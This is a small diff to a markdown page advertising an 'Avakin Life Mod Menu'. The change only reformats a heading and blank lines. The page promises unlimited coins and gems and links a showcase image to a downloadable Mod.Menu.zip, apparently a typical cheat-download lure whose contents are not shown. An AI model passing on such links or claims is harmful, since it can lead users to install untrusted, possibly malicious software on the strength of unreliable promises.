@@ -1,11 +1,11 @@
 ---
 title: "Avakin Life Mod Menu"
 ---
-[![Mod menu showcase on PC](https://github.com/pcmods/pcmods.github.io/blob/master/mod-menu-pc-showcase.jpg?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)# Avakin Life Mod Menus: Unlocking the Full Potential of the Game
+[![Mod menu showcase on PC](https://github.com/pcmods/pcmods.github.io/blob/master/mod-menu-pc-showcase.jpg?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)
+
+# Avakin Life Mod Menus: Unlocking the Full Potential of the Game
 
 Avakin Life is a popular virtual world game, but even the most dedicated players can get tired of the same old gameplay. That's where mod menus come in - they offer a wide range of new features and customization options to keep the game fresh and exciting.
-
-
 
 
 ## Unlimited Coins and Gems
